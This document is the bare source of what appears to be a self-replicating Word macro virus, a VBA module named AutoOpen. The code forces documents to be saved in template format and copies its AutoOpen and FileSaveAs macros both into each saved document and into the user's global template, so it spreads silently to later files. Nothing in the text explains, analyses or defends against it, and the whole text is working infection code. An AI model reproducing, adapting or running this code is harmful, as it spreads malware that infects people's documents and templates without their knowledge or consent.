   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim Name_$
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg

   If dlg.Format = 0 Then
   dlg.Format = 1
   Name_$ = WordBasic.[FileName$]()
   WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs"
   WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
   WordBasic.FileSaveAs dlg
   End If

   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen"
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":filesaveas", "Global:FileSaveAs"
   End Sub
